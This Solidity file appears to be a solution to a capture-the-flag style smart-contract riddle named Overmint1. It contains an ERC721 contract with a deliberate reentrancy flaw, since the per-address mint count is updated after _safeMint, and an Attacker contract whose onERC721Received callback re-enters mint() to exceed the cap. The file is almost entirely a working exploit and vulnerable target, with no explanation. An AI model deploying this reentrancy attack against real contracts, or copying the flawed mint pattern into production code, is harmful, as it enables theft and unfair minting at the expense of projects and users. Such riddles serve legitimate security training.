// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title Overmint1 Solidity Riddle
 * @author Josh Guha
 */

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

contract Attacker is IERC721Receiver {
    Overmint1 public vulnerableNFT;

    constructor(Overmint1 _vulnerableNFT) {
        vulnerableNFT = _vulnerableNFT;
    }

    /**
     * @dev Begins the mint execution
     */
    function attack() external {
        vulnerableNFT.mint();
    }

    /**
     * @dev Conducts reentrancy attack upon being externally called by vulnerable contract
     * @return bytes4 magic value `IERC721Receiver.onERC721Received.selector`
     */
    function onERC721Received(
        address, // operator
        address, // from
        uint256, // tokenId
        bytes calldata // data
    ) external returns (bytes4) {
        bool success = vulnerableNFT.success(address(this));

        if (!success) {
            vulnerableNFT.mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
